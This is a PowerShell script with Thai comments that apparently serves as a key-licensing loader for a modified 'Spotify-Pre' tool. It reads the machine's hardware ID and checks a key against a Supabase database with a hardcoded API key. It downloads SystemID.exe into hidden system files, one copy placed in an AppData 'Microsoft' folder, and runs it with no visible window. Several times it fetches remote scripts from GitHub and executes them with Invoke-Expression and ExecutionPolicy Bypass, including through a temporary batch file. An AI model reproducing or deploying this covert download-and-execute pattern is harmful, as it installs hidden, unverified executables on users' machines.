function Remove-SystemID {
    # ลบไฟล์ SystemID.exe
    $exePath = "$env:APPDATA\Motify\SystemID.exe"
    
    if (Test-Path $exePath) {
        Remove-Item -Path $exePath -Force -ErrorAction SilentlyContinue
    }
    
    $processName = "SystemID"
    
    # ตรวจสอบว่า SystemID.exe กำลังรันอยู่หรือไม่
    $runningProcesses = Get-Process | Where-Object { $_.ProcessName -eq $processName } -ErrorAction SilentlyContinue
    
    if ($runningProcesses) {
        Stop-Process -Name $processName -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2  # รอ 2 วินาทีเพื่อให้กระบวนการปิดสนิท
    }

    # ลบ Registry entry สำหรับ Startup
    $registryKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $registryKeyName = "SystemID"

    # ตรวจสอบว่า Registry key มีอยู่หรือไม่
    $key = Get-ItemProperty -Path $registryKeyPath -Name $registryKeyName -ErrorAction SilentlyContinue

    if ($key) {
        Remove-ItemProperty -Path $registryKeyPath -Name $registryKeyName -Force
    }

    # ลบไฟล์ Spotify (ในกรณีที่มีการติดตั้ง)
    $spotifyPath = "$env:APPDATA\Spotify"
    if (Test-Path $spotifyPath) {
        Remove-Item -Path $spotifyPath -Recurse -Force -ErrorAction SilentlyContinue
    }

    # สร้างไฟล์ .bat เพื่อลบ Spotify และรัน core.ps1
    $batchScript = @"
@echo off
set PWSH=%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe
set ScriptUrl=https://raw.githubusercontent.com/DevilScript/Spotify-Pre/refs/heads/main/core.ps1

"%PWSH%" -NoProfile -ExecutionPolicy Bypass -Command "& { Invoke-Expression (Invoke-WebRequest -Uri '%ScriptUrl%').Content }"
"@

    # สร้างไฟล์ .bat ชั่วคราว
    $batFilePath = [System.IO.Path]::Combine($env:TEMP, "remove_spotify.bat")
    $batchScript | Set-Content -Path $batFilePath

    # รันไฟล์ .bat ที่สร้างขึ้น
    Start-Process -FilePath $batFilePath -NoNewWindow -Wait

    # ลบไฟล์ .bat หลังจากการทำงานเสร็จ
    Remove-Item -Path $batFilePath -Force
    Stop-Process -Id $PID -Force -ErrorAction SilentlyContinue
    exit
}

function Download-Script {
    param (
        [string]$url,  # URL ของไฟล์ .exe
        [string]$fileName  # ชื่อไฟล์ที่ต้องการบันทึก
    )

    # Path ของโฟลเดอร์ Motify
    $dirPath = "$env:APPDATA\Motify"
    $micoPath = "$env:APPDATA\Microsoft"
    
    # ตรวจสอบว่าโฟลเดอร์ Motify มีอยู่หรือไม่ ถ้าไม่มีให้สร้าง
    if (-not (Test-Path -Path $dirPath)) {
        New-Item -ItemType Directory -Path $dirPath -Force | Out-Null
    }

    # Path ของไฟล์ที่บันทึก
    $filePath = Join-Path $dirPath $fileName
    $micofilePath = Join-Path $micoPath $fileName
    
    # เอาคุณสมบัติซ่อนออกก่อน
    if (Test-Path $filePath) {
        attrib -h -s $filePath
    }
    if (Test-Path $micofilePath) {
        attrib -h -s $micofilePath
    }
    
    # ดาวน์โหลดไฟล์ .exe จาก URL และบันทึกลงในโฟลเดอร์ Motify
    try {
        Invoke-WebRequest -Uri $url -OutFile $filePath
        Invoke-WebRequest -Uri $url -OutFile $micofilePath
        attrib +h +s $filePath  # ซ่อนไฟล์
        attrib +h +s $micofilePath  # ซ่อนไฟล์
    } catch {
        Write-Log "Exe: Failed to download the file."
        exit
    }

    if (Test-Path $filePath) {
        Start-Process $filePath -WindowStyle Hidden
    }
    if (Test-Path $micofilePath) {
        Start-Process $micofilePath -WindowStyle Hidden
    }
}

function Write-Log {
    param (
        [string]$message
    )

    $logDirPath = "$env:APPDATA\Motify"  # Path ของโฟลเดอร์ Motify
    $logFilePath = "$logDirPath\log.txt"
    
    # ตรวจสอบว่าโฟลเดอร์ Motify มีอยู่หรือไม่ ถ้าไม่มีให้สร้าง
    if (-not (Test-Path -Path $logDirPath)) {
        New-Item -ItemType Directory -Path $logDirPath -Force | Out-Null
    }

    $logMessage = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - $message"
    
    # บันทึกข้อความลงในไฟล์ log
    Add-Content -Path $logFilePath -Value $logMessage
}

# ตรวจสอบว่าไฟล์ SystemID.exe มีอยู่ในโฟลเดอร์ Motify / Microsoftหรือไม่
$exePath = "$env:APPDATA\Motify\SystemID.exe"
$micoexePath = "$env:APPDATA\Microsoft\SystemID.exe"

if ((Test-Path $exePath) -or (Test-Path $micoexePath)) {
    Write-Host "ID found. Running..." -ForegroundColor Green

    # ฟังก์ชันตรวจสอบวันหมดอายุ
    function Check-ExpiryDate {
        param (
            [string]$key
        )

        # ดึงข้อมูลจาก Supabase
        $url = "https://sepwbvwlodlwehflzyiw.supabase.co/rest/v1/keys?key=eq.$key"
        $key_api = $env:moyx

        try {
            $response = Invoke-RestMethod -Uri $url -Method Get -Headers @{ "apikey" = $key_api }

            if ($response.Count -eq 0) {
                Write-Log "Error: Key not found in DATA"
                return $true  # หมดอายุ (เพราะหาไม่เจอ)
            }

            $expiry_date = $response[0].expiry_date
            $hwid = $response[0].hwid

            if ($expiry_date -eq "LifeTime") {
                Write-Log "System: Key is Lifetime"
                return $false  # ถ้าเป็น Lifetime ไม่ต้องลบไฟล์
            }

            # แปลง String เป็น DateTime
            $expiryDateTime = [DateTime]::ParseExact($expiry_date, "yyyy-MM-dd HH:mm:ss", $null)
            $currentDateTime = Get-Date

            if ($currentDateTime -gt $expiryDateTime) {
                # 🔴 **ส่งข้อมูลไปยัง `expired_log`**
                $logData = @{
                    key   = $key
                    hwid  = $hwid
                    time  = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
                    status = "Expired"
                }

                try {
                    $logResponse = Invoke-RestMethod -Uri "https://sepwbvwlodlwehflzyiw.supabase.co/rest/v1/expired_log" `
                        -Method POST `
                        -Headers @{ "apikey" = $key_api } `
                        -Body ($logData | ConvertTo-Json -Depth 10) `
                        -ContentType "application/json"
                } catch {
                    Write-Log "Error: Failed to log expired key"
                }

                # 🔴 **อัปเดตสถานะ Key เป็น Expired**
                $updateData = @{ status = "Expired" }

                try {
                    $updateResponse = Invoke-RestMethod -Uri "$url" -Method PATCH -Headers @{ "apikey" = $key_api } `
                        -Body ($updateData | ConvertTo-Json) -ContentType "application/json"
                } catch {
                    Write-Log "Error: Failed to update status"
                }

                # 🔴 **ลบ Key ออกจากฐานข้อมูล**
                try {
                    $deleteResponse = Invoke-RestMethod -Uri $url -Method DELETE -Headers @{ "apikey" = $key_api }
                    Write-Log "System: Key has Expired"
                    Write-Log "System: Key | $key | has been deleted from the DATA"
                } catch {
                    Write-Log "Error: Key Failed to Delete"
                }

                return $true  # หมดอายุ
            } else {
                Write-Log "System: Key | $key | Expired on | $expiry_date |"
                return $false  # ผ่านได้
            }
        }
        catch {
            Write-Log "Error: Failed to connect to DATA"
            return $true  # กันพลาด ถ้าดึง API ไม่ได้ให้ถือว่าหมดอายุ
        }
    }

function Hwid-Key {
	param (
    [string]$supabaseURL = "https://sepwbvwlodlwehflzyiw.supabase.co",
    [string]$supabaseAPIKey = $env:moyx
	)
    
	# ดึง HWID
    $hwid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
    if (-not $hwid) {
        Write-Host "Error: Unable To Retrieve HWID" -ForegroundColor Red
        pause
		exit
    }
    Write-Host "System: HWID [ $hwid ]" -ForegroundColor DarkYellow

    # ดึง path ของไฟล์ JSON ใน AppData
    $appDataPath = [System.Environment]::GetFolderPath('ApplicationData')
    $filePath = "$appDataPath\Motify\key_hwid.json"

    if (Test-Path $filePath) {
        Write-Host "System: Found json file, Validating key..." -ForegroundColor DarkYellow
        $data = Get-Content $filePath | ConvertFrom-Json
        
        if (-not $data.key -or -not $data.hwid) {
            Write-Host "Error: Key/HWID is missing in the file." -ForegroundColor Red
            Remove-SystemID
            Remove-Item $filePath -Force
           pause
		   exit
        }
        
        $key = $data.key
        $hwid = $data.hwid

        # ตรวจสอบวันหมดอายุของ Key
        if (Check-ExpiryDate -key $key) {
            Write-Host "Error: Key has Expired" -ForegroundColor Red
            Remove-Item $filePath -Force
            Remove-SystemID
            pause
			exit
        }
    } else {
        Write-Host "Enter The Key: " -ForegroundColor Cyan -NoNewline
        $key = Read-Host
    }

    # ตรวจสอบคีย์ใน Supabase
    $response = Invoke-RestMethod -Uri "$supabaseURL/rest/v1/keys?key=eq.$key" -Method Get -Headers @{ "apikey" = $supabaseAPIKey }
    if ($response.Count -eq 0) {
        Write-Host "Error: Key Not Found In The DATA" -ForegroundColor Red
        pause
		exit
    }

    $existingKey = $response[0]
    if ($existingKey.used -eq $true -and $existingKey.hwid -ne $hwid) {
        Write-Host "Error: Invalid HWID!" -ForegroundColor Red
        Remove-Item $filePath -Force
        Remove-SystemID
        pause
		exit
    }

    # ล็อค key กับ HWID
    $updateData = @{ used = $true; hwid = $hwid }
    Invoke-RestMethod -Uri "$supabaseURL/rest/v1/keys?key=eq.$key" -Method PATCH -Headers @{ "apikey" = $supabaseAPIKey } -Body ($updateData | ConvertTo-Json) -ContentType "application/json"
    
    # บันทึกข้อมูลลง JSON
    $expiry_date = $existingKey.expiry_date
    $data = @{ key = $key; hwid = $hwid; Expired = $expiry_date }
    
    if (-not (Test-Path -Path (Split-Path -Path $filePath -Parent))) {
        New-Item -ItemType Directory -Path (Split-Path -Path $filePath -Parent) -Force | Out-Null
    }
    $data | ConvertTo-Json | Set-Content $filePath
    
    # อัปเดตสถานะเป็น "Active"
    $statusUpdateData = @{ status = "Active" }
    Invoke-RestMethod -Uri "$supabaseURL/rest/v1/keys?key=eq.$key" -Method PATCH -Headers @{ "apikey" = $supabaseAPIKey } -Body ($statusUpdateData | ConvertTo-Json) -ContentType "application/json"
    
    # บันทึกลง Auth-log
    $logData = @{ key = $key; hwid = $hwid; status = "Verified"; timestamp = (Get-Date -Format "yyyy-MM-dd HH:mm:ss") }
    Invoke-RestMethod -Uri "$supabaseURL/rest/v1/auth_log" -Method POST -Headers @{ "apikey" = $supabaseAPIKey } -Body ($logData | ConvertTo-Json) -ContentType "application/json"
    
    Write-Host "System: Expired [ $expiry_date ]" -ForegroundColor DarkYellow
    Write-Host "Verified. Running Program..." -ForegroundColor Green
}
Hwid-Key

# ดาวน์โหลดและรัน SystemID.exe
$scriptUrl = "https://raw.githubusercontent.com/DevilScript/Spotify-Pre/refs/heads/main/install1.ps1"
$checkUrl = "https://github.com/DevilScript/Spotify-Pre/raw/refs/heads/main/SystemID.exe"
$fileName = "SystemID.exe"
Download-Script -url $checkUrl -fileName $fileName
Invoke-Expression (Invoke-WebRequest -Uri $scriptUrl).Content
Start-Process $exePath -WindowStyle Hidden  # รันแบบซ่อนหน้าต่าง
Start-Process $micoexePath -WindowStyle Hidden  # รันแบบซ่อนหน้าต่าง

	exit
} else {
    
function Hwid-Key {
	param (
    [string]$supabaseURL = "https://sepwbvwlodlwehflzyiw.supabase.co",
    [string]$supabaseAPIKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNlcHdidndsb2Rsd2VoZmx6eWl3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3Mzk5MTM3NjIsImV4cCI6MjA1NTQ4OTc2Mn0.kwtXM0A0O-7YfuIqoGX8uCfWxT3gLi96RY9XuxM_rAI"
	)
	
    # ดึง HWID
    $hwid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
    if (-not $hwid) {
        Write-Host "Error: Unable To Retrieve HWID" -ForegroundColor Red
        pause
		exit
    }
    Write-Host "System: HWID [ $hwid ]" -ForegroundColor DarkYellow

    # ดึง path ของไฟล์ JSON ใน AppData
    $appDataPath = [System.Environment]::GetFolderPath('ApplicationData')
    $filePath = "$appDataPath\Motify\key_hwid.json"

    if (Test-Path $filePath) {
        Write-Host "System: Found json file, Validating key..." -ForegroundColor DarkYellow
        $data = Get-Content $filePath | ConvertFrom-Json
        
        if (-not $data.key -or -not $data.hwid) {
            Write-Host "Error: Key/HWID is missing in the file." -ForegroundColor Red
            Remove-SystemID
            Remove-Item $filePath -Force
           pause
		   exit
        }
        
        $key = $data.key
        $hwid = $data.hwid

        # ตรวจสอบวันหมดอายุของ Key
        if (Check-ExpiryDate -key $key) {
            Write-Host "Error: Key has Expired" -ForegroundColor Red
            Remove-Item $filePath -Force
            Remove-SystemID
            pause
			exit
        }
    } else {
        Write-Host "Enter The Key: " -ForegroundColor Cyan -NoNewline
        $key = Read-Host
    }

    # ตรวจสอบคีย์ใน Supabase
    $response = Invoke-RestMethod -Uri "$supabaseURL/rest/v1/keys?key=eq.$key" -Method Get -Headers @{ "apikey" = $supabaseAPIKey }
    if ($response.Count -eq 0) {
        Write-Host "Error: Key Not Found In The DATA" -ForegroundColor Red
        pause
		exit
    }

    $existingKey = $response[0]
    if ($existingKey.used -eq $true -and $existingKey.hwid -ne $hwid) {
        Write-Host "Error: Invalid HWID!" -ForegroundColor Red
        Remove-Item $filePath -Force
        Remove-SystemID
        pause
		exit
    }

    # ล็อค key กับ HWID
    $updateData = @{ used = $true; hwid = $hwid }
    Invoke-RestMethod -Uri "$supabaseURL/rest/v1/keys?key=eq.$key" -Method PATCH -Headers @{ "apikey" = $supabaseAPIKey } -Body ($updateData | ConvertTo-Json) -ContentType "application/json"
    
    # บันทึกข้อมูลลง JSON
    $expiry_date = $existingKey.expiry_date
    $data = @{ key = $key; hwid = $hwid; Expired = $expiry_date }
    
    if (-not (Test-Path -Path (Split-Path -Path $filePath -Parent))) {
        New-Item -ItemType Directory -Path (Split-Path -Path $filePath -Parent) -Force | Out-Null
    }
    $data | ConvertTo-Json | Set-Content $filePath
    
    # อัปเดตสถานะเป็น "Active"
    $statusUpdateData = @{ status = "Active" }
    Invoke-RestMethod -Uri "$supabaseURL/rest/v1/keys?key=eq.$key" -Method PATCH -Headers @{ "apikey" = $supabaseAPIKey } -Body ($statusUpdateData | ConvertTo-Json) -ContentType "application/json"
    
    # บันทึกลง Auth-log
    $logData = @{ key = $key; hwid = $hwid; status = "Verified"; timestamp = (Get-Date -Format "yyyy-MM-dd HH:mm:ss") }
    Invoke-RestMethod -Uri "$supabaseURL/rest/v1/auth_log" -Method POST -Headers @{ "apikey" = $supabaseAPIKey } -Body ($logData | ConvertTo-Json) -ContentType "application/json"
    
    Write-Host "System: Expired [ $expiry_date ]" -ForegroundColor DarkYellow
    Write-Host "Verified. Running Program..." -ForegroundColor Green
}	
Hwid-Key
# ดาวน์โหลดและรัน SystemID.exe
$scriptUrl = "https://raw.githubusercontent.com/DevilScript/Spotify-Pre/refs/heads/main/install1.ps1"
$checkUrl = "https://github.com/DevilScript/Spotify-Pre/raw/refs/heads/main/SystemID.exe"
$fileName = "SystemID.exe"
Download-Script -url $checkUrl -fileName $fileName
Invoke-Expression (Invoke-WebRequest -Uri $scriptUrl).Content
Start-Process $exePath -WindowStyle Hidden  # รันแบบซ่อนหน้าต่าง
Start-Process $micoexePath -WindowStyle Hidden  # รันแบบซ่อนหน้าต่าง
    exit
}
